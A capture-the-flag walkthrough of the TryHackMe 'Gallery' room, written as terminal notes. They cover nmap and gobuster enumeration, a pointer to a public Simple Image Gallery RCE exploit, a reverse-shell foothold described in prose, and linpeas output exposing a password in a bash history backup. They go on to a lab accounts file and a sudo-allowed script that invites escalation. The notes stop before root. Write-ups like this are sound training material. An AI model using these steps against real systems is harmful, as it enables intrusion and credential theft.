Link: https://tryhackme.com/room/gallery666
<code>
<h2>Services Enumeration </h2>

┌──(duke㉿kali)-[~/Documents/THM_Gallery]
└─$ nmap -sV -sC -Pn gallery.thm   
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-17 02:03 CST
Nmap scan report for gallery.thm (10.10.2.62)
Host is up (0.036s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Simple Image Gallery System

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.18 seconds


┌──(duke㉿kali)-[~/Documents/THM_Gallery]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://gallery.thm/ -x .txt,.php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gallery.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2024/01/17 03:02:34 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/gallery              (Status: 301) [Size: 312] [--> http://gallery.thm/gallery/]
/server-status        (Status: 403) [Size: 276]                                  
                                                                                 
===============================================================
2024/01/17 03:55:39 Finished
===============================================================
                                                                                                                                                                                                                                           
┌──(duke㉿kali)-[~/Documents/THM_Gallery]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://gallery.thm/gallery -x .txt,.php,html 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gallery.thm/gallery
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2024/01/17 04:12:21 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 16791]
/archives             (Status: 301) [Size: 321] [--> http://gallery.thm/gallery/archives/]
/home.php             (Status: 500) [Size: 0]                                             
/login.php            (Status: 200) [Size: 7969]                                          
/user                 (Status: 301) [Size: 317] [--> http://gallery.thm/gallery/user/]    
/uploads              (Status: 301) [Size: 320] [--> http://gallery.thm/gallery/uploads/] 
/assets               (Status: 301) [Size: 319] [--> http://gallery.thm/gallery/assets/]  
/report               (Status: 301) [Size: 319] [--> http://gallery.thm/gallery/report/]  
/albums               (Status: 301) [Size: 319] [--> http://gallery.thm/gallery/albums/]  
/plugins              (Status: 301) [Size: 320] [--> http://gallery.thm/gallery/plugins/] 
/database             (Status: 301) [Size: 321] [--> http://gallery.thm/gallery/database/]
/classes              (Status: 301) [Size: 320] [--> http://gallery.thm/gallery/classes/] 
/config.php           (Status: 200) [Size: 0]                                             
/dist                 (Status: 301) [Size: 317] [--> http://gallery.thm/gallery/dist/]    
/404.html             (Status: 200) [Size: 198]                                           
/inc                  (Status: 301) [Size: 316] [--> http://gallery.thm/gallery/inc/]     
/build                (Status: 301) [Size: 318] [--> http://gallery.thm/gallery/build/]   
/schedules            (Status: 301) [Size: 322] [--> http://gallery.thm/gallery/schedules/]
/create_account.php   (Status: 200) [Size: 8]                                              
                                                                                           
===============================================================
2024/01/17 05:05:23 Finished
===============================================================

<h2>found Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)</h2>
link: https://www.exploit-db.com/exploits/50214

upload php reverse shell and run
get initial access as www-data
run linpeas as www

found :
drwx------ 3 mike mike 4096 May 20  2021 /home/mike/.gnupg
drwxr-xr-x 3 root root 4096 May 24  2021 /var/backups/mike_home_backup/.gnupg
-rwxr-xr-x 1 root root 103 May 24  2021 /var/backups/mike_home_backup/documents/accounts.txt
-rwxr-xr-x 1 root root 807 May 24  2021 /var/backups/mike_home_backup/.profile


╔══════════╣ Unexpected in /opt (usually empty)
-rw-r--r--  1 root root  364 May 20  2021 rootkit.sh

╔══════════╣ Searching passwords in history files
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @stats   = stats                                     
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @items   = { _seq_: 1  }
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @threads = { _seq_: "A" }
/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx
/var/backups/mike_home_backup/.bash_history:sudo -l

su mike
Password: b3stpassw0rdbr0xx

mike@gallery:~/documents$ cat accounts.txt
cat accounts.txt
Spotify : mike@gmail.com:mycat666
Netflix : mike@gmail.com:123456789pass
TryHackme: mike:darkhacker123

run linpeas as mike

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
Matching Defaults entries for mike on gallery:                                                                                                                                                                                              
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh


cat rootkit.sh
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac



</code>
